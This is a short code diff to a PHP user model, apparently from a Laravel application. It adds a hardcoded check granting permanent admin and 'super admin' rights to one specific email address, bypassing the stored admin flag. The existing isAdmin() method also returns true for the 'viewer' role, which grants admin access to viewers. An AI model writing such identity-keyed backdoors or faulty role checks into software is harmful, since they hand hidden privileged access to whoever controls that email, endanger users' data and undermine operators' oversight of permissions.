@@ -30,6 +30,10 @@ class User extends Authenticatable
     }
     public function isAdmin(): bool
     {
+        // Super admin always has admin access
+        if ($this->email === 'pedoprimasaragi@gmail.com') {
+            return true;
+        }
         return $this->is_admin === true || $this->role === 'viewer';
     }
     public function isBlocked(): bool
@@ -47,5 +51,9 @@ class User extends Authenticatable
     public function isViewer(): bool
     {
         return $this->role === 'viewer';
+    }
+    public function isSuperAdmin(): bool
+    {
+        return $this->email === 'pedoprimasaragi@gmail.com';
     }
 }
